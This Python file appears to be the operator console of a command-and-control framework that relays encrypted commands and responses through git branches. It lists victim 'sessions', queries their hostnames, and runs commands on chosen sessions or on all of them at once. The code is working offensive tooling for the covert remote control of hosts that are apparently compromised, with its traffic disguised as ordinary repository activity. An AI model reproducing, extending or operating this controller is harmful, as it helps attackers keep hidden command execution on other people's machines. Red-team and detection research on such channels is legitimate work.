import asyncio
import os
import git
from typing import List, Dict, Callable, Any
from master.core import SessionManager, JobManager

class Menu:
    def __init__(self, session_manager: SessionManager, job_manager: JobManager):
        self.session_manager = session_manager
        self.job_manager = job_manager
        self.commands: Dict[str, Dict[str, Any]] = {
            "help": {
                "func": self.cmd_help,
                "help": "Show this help message",
                "usage": "help"
            },
            "sessions": {
                "func": self.cmd_sessions,
                "help": "List active sessions",
                "usage": "sessions"
            },
            "interact": {
                "func": self.cmd_interact,
                "help": "Interact with a session",
                "usage": "interact <session_id>"
            },
            "jobs": {
                "func": self.cmd_jobs,
                "help": "List all jobs",
                "usage": "jobs"
            },
            "run": {
                "func": self.cmd_run,
                "help": "Run command on target sessions",
                "usage": "run <command> [session_id1,session_id2,...]"
            },
            "clear": {
                "func": self.cmd_clear,
                "help": "Remove sessions and their branches (use 'force' to remove active sessions)",
                "usage": "clear [force]"
            },
            "exit": {
                "func": self.cmd_exit,
                "help": "Exit the program",
                "usage": "exit"
            }
        }

    def get_commands(self) -> List[str]:
        """Get list of available commands"""
        return list(self.commands.keys())

    async def handle_command(self, command_line: str):
        """Handle command input"""
        parts = command_line.strip().split(maxsplit=1)
        if not parts:
            return

        cmd = parts[0].lower()
        args = parts[1] if len(parts) > 1 else ""

        if cmd in self.commands:
            await self.commands[cmd]["func"](args)
        else:
            print(f"Unknown command: {cmd}")
            print("Type 'help' for available commands")

    async def cmd_help(self, args: str):
        """Show help message"""
        print("\nAvailable commands:")
        for cmd, info in self.commands.items():
            print(f"{cmd:10} - {info['help']}")
            print(f"           Usage: {info['usage']}")
        print()

    async def cmd_sessions(self, args: str):
        """List active sessions"""
        from prettytable import PrettyTable
        
        await self.session_manager.scan_for_sessions()
        active_sessions = await self.session_manager.get_active_sessions()
        
        # Try to get hostnames for all sessions
        for session in active_sessions:
            if session.hostname == session.id:  # If hostname hasn't been set yet
                encrypted_cmd = self.session_manager.crypto.encrypt("hostname")
                if self.session_manager.git_handler.write_command(session.id, encrypted_cmd):
                    await asyncio.sleep(5)  # Wait for response
                    encrypted_response = self.session_manager.git_handler.read_response(session.id)
                    if encrypted_response:
                        hostname = self.session_manager.crypto.decrypt(encrypted_response)
                        if hostname:
                            session.hostname = hostname.strip()
        
        # Show all sessions, not just active ones
        sessions = list(self.session_manager.sessions.values())
        if sessions:
            table = PrettyTable()
            table.field_names = ["ID", "Hostname", "Last seen", "Health"]
            for session in sessions:
                table.add_row([
                    session.id,
                    session.hostname,
                    session.last_seen.strftime("%Y-%m-%d %H:%M:%S"),
                    "Active" if session.is_active else "Dead"
                ])
            print("\nSessions:")
            print(table)
        else:
            print("No sessions found")

    async def cmd_interact(self, args: str):
        """Interact with a session"""
        if not args:
            print("Usage: interact <session_id>")
            return

        session = await self.session_manager.get_session(args)
        if not session:
            print(f"Session {args} not found")
            return

        print(f"\nInteracting with session {session.id} ({session.hostname})")
        print("Type 'back' or 'exit' to return to main menu")

        # Create prompt session with history at the start
        from prompt_toolkit import PromptSession
        from prompt_toolkit.history import InMemoryHistory
        prompt_session = PromptSession(history=InMemoryHistory())

        # Start job monitoring task
        job_monitor_task = asyncio.create_task(self._monitor_jobs(session.id))

        while True:
            try:
                # Fetch latest changes first
                self.session_manager.git_handler.repo.git.fetch('origin', session.id)
                self.session_manager.git_handler.repo.git.checkout('-B', session.id, f'origin/{session.id}')
                
                # Check current state and handle previous command if needed
                state_file = os.path.join(self.session_manager.git_handler.config.local_repo_path, "state")
                if os.path.exists(state_file):
                    with open(state_file, "r") as f:
                        state = f.read().strip()
                    
                    if state == "1":
                        try:
                            # Read previous command and response
                            cmd_file = os.path.join(self.session_manager.git_handler.config.local_repo_path, "command.txt")
                            resp_file = os.path.join(self.session_manager.git_handler.config.local_repo_path, "response.txt")
                            
                            prev_cmd = None
                            prev_resp = None
                            
                            if os.path.exists(cmd_file):
                                with open(cmd_file, "r") as f:
                                    content = f.read().strip()
                                    if content:
                                        prev_cmd = self.session_manager.crypto.decrypt(content)
                                        
                            if os.path.exists(resp_file):
                                with open(resp_file, "r") as f:
                                    content = f.read().strip()
                                    if content:
                                        prev_resp = self.session_manager.crypto.decrypt(content)
                            
                            if prev_cmd is not None:
                                print(f"\nPrevious command: {prev_cmd}")
                            if prev_resp is not None:
                                print(f"Response: {prev_resp}\n")
                            
                            # Set state to 2
                            with open(state_file, "w") as f:
                                f.write("2")
                            self.session_manager.git_handler.repo.index.add(["state"])
                            self.session_manager.git_handler.repo.index.commit("Mark response as read")
                            
                            try:
                                self.session_manager.git_handler.repo.remote().push()
                            except git.GitCommandError as e:
                                if "failed to push" in str(e):
                                    self.session_manager.git_handler.repo.git.pull('--rebase', 'origin', session.id)
                                    self.session_manager.git_handler.repo.remote().push()
                        except Exception as e:
                            print(f"Error processing previous command: {e}")

                command = await prompt_session.prompt_async(f"{session.id}> ")
                command = command.strip()
                if not command:  # Skip empty commands
                    continue
                    
                if command.lower() in ['back', 'exit']:
                    print("\nExiting interactive mode...")
                    job_monitor_task.cancel()
                    try:
                        await job_monitor_task
                    except asyncio.CancelledError:
                        pass
                    break
                elif command.lower() == 'jobs':
                    await self.cmd_jobs('')
                    continue

                # Create a background job for the command
                if command.lower() == 'jobs':
                    await self.cmd_jobs('')
                    continue
                
                # Create and monitor job
                job = await self.job_manager.create_job(command, [session.id])
                print(f"Created job {job.id}")

            except KeyboardInterrupt:
                print("\nUse 'back' or 'exit' to return to main menu")
                continue
            except EOFError:
                print("\nExiting interactive mode...")
                job_monitor_task.cancel()
                try:
                    await job_monitor_task
                except asyncio.CancelledError:
                    pass
                break

    async def cmd_jobs(self, args: str):
        """List all jobs"""
        jobs = await self.job_manager.get_jobs()
        if not jobs:
            print("No jobs")
            return

        print("\nJobs:")
        for job in jobs:
            print(f"ID: {job.id}")
            print(f"Status: {job.status.value}")
            print(f"Created: {job.created_at}")
            print(f"Target sessions: {', '.join(job.targets)}")
            if job.completed_at:
                print(f"Completed: {job.completed_at}")
            print(f"Command: {job.command}")
            print("Results:")
            for target, result in job.results.items():
                # Look up session to get hostname
                session = self.session_manager.sessions.get(target)
                hostname = session.hostname if session else "unknown"
                print(f"  {target} ({hostname}):\n{result}\n")
            print("---")
        print()

    async def cmd_run(self, args: str):
        """Run command on target sessions"""
        if not args:
            print("Usage: run <command> [session_id1,session_id2,...]")
            return

        # Split all arguments
        parts = args.split()
        if len(parts) < 2:
            print("Usage: run <command> <session_ids or *>")
            return

        # Last argument is session IDs or *
        target_arg = parts[-1].strip()
        
        # Everything between "run" and the last argument is the command
        command = " ".join(parts[:-1])

        # Handle * wildcard for all active sessions
        if target_arg == "*":
            active_sessions = await self.session_manager.get_active_sessions()
            if not active_sessions:
                print("No active sessions found")
                return
            targets = [s.id for s in active_sessions]
        else:
            targets = [t.strip() for t in target_arg.split(",")]

        job = await self.job_manager.create_job(command, targets)
        print(f"Created job {job.id}")

    async def cmd_clear(self, args: str):
        """Remove sessions and their branches"""
        force = "force" in args.strip().lower().split()
        
        # Get all branches first
        await self.session_manager.scan_for_sessions()
        all_sessions = list(self.session_manager.sessions.values())
        
        # Get sessions to remove based on force flag
        to_remove = []
        if force:
            to_remove = [s.id for s in all_sessions]
        else:
            to_remove = [s.id for s in all_sessions if not s.is_active]
        
        if not to_remove:
            print("No sessions to clear")
            return
        
        # Confirm if removing active sessions
        if force and any(s.is_active for s in all_sessions):
            active_count = sum(1 for s in all_sessions if s.is_active)
            print(f"WARNING: This will remove {active_count} active sessions!")
            confirmation = input("Are you sure? (yes/no): ")
            if confirmation.lower() != "yes":
                print("Operation cancelled")
                return
            
        print(f"Removing {len(to_remove)} sessions...")
        for session_id in to_remove:
            if await self.session_manager.remove_session(session_id):
                print(f"Removed session {session_id}")
            else:
                print(f"Failed to remove session {session_id}")

    async def _monitor_jobs(self, session_id: str):
        """Monitor jobs for the interactive session"""
        try:
            last_seen_results = {}
            while True:
                jobs = await self.job_manager.get_jobs()
                for job in jobs:
                    if session_id in job.targets:
                        result = job.results.get(session_id)
                        # Check if we have a new result or an updated result
                        if (result is not None and  # Result exists
                            (job.id not in last_seen_results or  # New job
                             last_seen_results[job.id] != result)):  # Updated result
                            print(f"\n>>> {session_id}: {job.command}\n{result}\n")
                            last_seen_results[job.id] = result
                await asyncio.sleep(1)
        except asyncio.CancelledError:
            pass
        except Exception as e:
            print(f"Job monitoring error: {e}")

    async def cmd_exit(self, args: str):
        """Exit the program"""
        raise EOFError
